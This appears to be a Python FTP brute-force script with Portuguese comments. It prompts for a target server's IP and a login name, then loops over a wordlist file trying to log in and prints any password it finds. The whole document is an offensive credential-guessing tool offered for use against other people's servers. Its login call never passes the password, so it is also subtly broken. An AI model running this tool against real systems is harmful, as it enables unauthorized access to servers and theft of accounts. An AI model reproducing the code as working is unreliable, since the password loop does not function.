#!/usr/bin/python
# -*- coding: utf-8 -*-

# ANTES DE TUDO, CRIE UMA PASTA .TXT NA SUA DESKTOP COM O NOME DE wordlist.txt COM AS SUAS SENHAS!
# E TAMBÉM SALVE O PROGRAMA EM PYTHON NA SUA ÁREA DE TRABALHO!

# DEIXAR BEM CLARO QUE O CRIADOR DESTE CODE FOI O MATTHEW PRYCE, EU APENAS ATUALIZEI O CODE PARA PYTHON 3. 

# IMPORTANDO A LIB DO FTP
import ftplib
import time

print('''

 © 2017 COPYRIGHT TODOS OS DIREITOS RESERVADOS POR GABRIEL SANTOS')

--------------------------------------------------------------------------------------

 ██████╗ ██████╗ ██╗   ██╗████████╗███████╗              ███████╗████████╗██████╗ 
 ██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝              ██╔════╝╚══██╔══╝██╔══██╗
 ██████╔╝██████╔╝██║   ██║   ██║   █████╗      █████╗    █████╗     ██║   ██████╔╝
 ██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝      ╚════╝    ██╔══╝     ██║   ██╔═══╝ 
 ██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗              ██║        ██║   ██║     
 ╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝              ╚═╝        ╚═╝   ╚═╝
 
--------------------------------------------------------------------------------------
 X----------------------------------------------------X
 | By: Gabriel Santos / Créditos: AnonymousKillerBR1  |
 X----------------------------------------------------X ''')

# PARTE O QUAL O PROGRAMA PEGARÁ AS INFOS PARA FAZER A CONEXÃO 

try:
    ip = str(input("\n [+] Digite o IP do Alvo FTP: "))
    login_ftp = input("\n [+] Digite o Login do Servidor FTP: ")

    print('\n --------------------------------------------')
    arquivo = open("wordlist.txt", "r")
    for linha in arquivo.readlines():
        try:

            servidor = ftplib.FTP(ip)  # ENFIM, CHEGAMOS NA ÁREA DA CONEXÃO E OS TESTES DE SENHA
            servidor.login (login_ftp)
            print(' --------------------------------------------')
            print("\n [!] Senha Encontrada: % s" % linha)
            print(' --------------------------------------------')
            break # CASO O PROGRAMA ENCONTRE A SENHA CORRETA, ELE IRÁ PARAR
        except ftplib.error_perm:
            print("\n [-] Senha Incorreta:  % s" % linha)
            print('\n --------------------------------------------')
except KeyboardInterrupt:
    print("\n [!] Fim do Programa!")
    time.sleep(0.6)
                       
